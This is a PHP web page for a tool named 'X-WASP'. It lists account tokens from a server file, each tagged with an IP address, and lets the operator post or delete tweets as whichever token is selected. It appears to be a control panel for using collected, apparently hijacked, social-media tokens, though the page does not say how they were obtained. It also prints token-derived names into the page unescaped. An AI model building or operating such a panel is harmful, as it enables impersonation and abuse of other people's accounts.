<!-- made by monarch60 -->
<?php
exec('python3 scripts/getusr.py', $output, $return_var);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X-WASP</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-image: url('images/background.jpg'); 
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            font-family: Arial, sans-serif;
            color: #5e1300;
        }
        .heading-container {
            background-color: black;
            border: 2px solid yellow;
            border-radius: 15px;
            width: fit-content;
            margin: 20px auto;
        }
        h1 {
            padding: 10px;
            text-align: center;
            color: white;
            margin: 0;
        }
        .container {
            background-color: black;
            border: 2px solid yellow;
            border-radius: 15px;
            padding: 20px;
            width: 650;
            margin: 20px auto;
        }
        form {
            margin: 0 auto;
            width: 500px;
            border-radius: 15px;
        }
        select, input[type="text"], button {
            width: 500px;
            height: 50px;
            background-color: #d3bc00;
            color: black;
            border: none;
            border-radius: 15px;
            margin: 5px;
            text-align: center; 
        }
        input[type="text"] {
            height: 200px;
            padding-top: 0;
        }
        input[type="text"]::placeholder {
            color: black;
            font-size: 12px; 
            text-transform: lowercase; 
            text-align: center;
        }
        textarea {
            width: 480px;
            height: 150px;
            background-color: #d3bc00;
            color: black;
            border: none;
            border-radius: 15px;
            margin: 5px;
            text-align: center;
            resize: none;
            overflow: auto;
            display: block;
        }
        textarea {
            padding: 10px;
        }
        button:hover {
            background-color: #5e1300;
            cursor: pointer;
        }
        .red-button {
            width: 500px;
            height: 50px;
            background-color: #d3bc00;
            color: black;
            border: none;
            border-radius: 15px;
            margin: 5px;
            text-align: center;
        }
        .red2 {
            width: 500px;
            height: 50px;
            background-color: #d3bc00; 
            color: black;
            border: none;
            border-radius: 15px;
            margin: 5px;
            text-align: center;
        }
        .yellow-token {
            background-color: #000000;
            color: white;
        }
        .green-token {
            background-color: green;
            color: white;
        }
        .image-container {
            text-align: center;
            margin-bottom: 20px;
        }
        .image-container img {
            width: 550px; 
            height: auto; 
        }
        .center {
          margin: 0;
          position: absolute;
          top: 50%;
          left: 50%;
          -ms-transform: translate(-50%, -50%);
          transform: translate(-50%, -50%);
        }
    </style>
</head>
<body>
	<div class="center">
    <div class="container">
	    <div class="image-container">
    	    <img src="images/head.jpg" alt="Yellowjacket Logo">
    	</div>
        <form method="post">
            <select name="selected_token">
                <?php
                $lines = file("/var/www/html/data/tokens.temp", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                foreach ($lines as $line) {
                    $token_data = explode("|", $line);
                    $ip_address = end($token_data);
                    $username = str_replace('>', '', $ip_address);
                    $username = str_replace('^', '', $username); 
                    $class = '';
                    if (strpos($ip_address, '>') !== false) {
                        $class = 'yellow-token';
                    } elseif (strpos($ip_address, '^') !== false) {
                        $class = 'green-token';
                    }
                    echo "<option value='" . htmlspecialchars($line) . "'class='$class' style='text-align: center;'>$username</option>";
                }
                ?>
            </select>
            <br><br>
            <textarea name="additional_data" placeholder="Paste or type tweet text that you wish to post with token selected above" onkeydown="if(event.keyCode==13){event.preventDefault();this.value+= '\n'}"></textarea>
            <br><br>
            <button type="submit" name="post_tweet">POST TWEET</button>
            <button type="submit" name="refresh_token_list">REFRESH TOKEN LIST</button>
            <button type="submit" name="delete_token">DELETE TOKEN</button>

        </form>
        <form method="post" action="pages/delete.php">
            <button class="red-button" type="submit">OPEN TWEET DELETE TOOL</button>
        </form>
        <?php
        if (isset($_POST["post_tweet"])) {
            $selected_token = $_POST["selected_token"];
            $additional_data = $_POST["additional_data"];
            file_put_contents('data/in.temp', $selected_token . "|" . $additional_data);
            exec('python3 scripts/tweet.py', $output, $return_var);
            if ($return_var == 0) {
                echo "<script>alert('TWEET POSTED SUCCESSFULLY');</script>";
            } else {
                echo "<script>alert('ERROR: TWEET FAILED TO POST');</script>";
            }
        }
        if (isset($_POST["delete_token"])) {
            $selected_token = $_POST["selected_token"];
            $lines = file("data/tokens.temp", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $new_lines = array_filter($lines, function($line) use ($selected_token) {
                return $line !== $selected_token;
            });
            file_put_contents('data/tokens.temp', implode(PHP_EOL, $new_lines));
            echo "<script>window.location.reload();</script>";
        }
        if (isset($_POST["refresh_token_list"])) {
            echo "<script>window.location.reload();</script>";
        }
        ?>
    </div>
    </div>
</body>
</html>
